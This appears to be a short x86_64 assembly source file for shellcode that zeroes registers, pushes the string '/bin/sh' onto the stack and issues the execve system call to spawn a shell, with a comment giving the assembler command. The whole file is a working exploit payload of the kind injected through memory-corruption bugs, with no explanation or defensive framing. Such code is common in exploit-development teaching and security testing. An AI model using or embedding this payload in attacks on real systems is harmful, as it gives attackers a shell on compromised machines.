
/* intel x86_64 assembly code to execve("/bin/sh", NULL, NULL) */
/* compiled using as -o shellcode.o shellcode.s */

_start:
xor rax, rax
xor rdi, rdi
xor rsi, rsi
xor rdx, rdx

mov rdi, 0x68732f6e69622f
push rdi
mov rdi, rsp

mov al, 0x3b
syscall
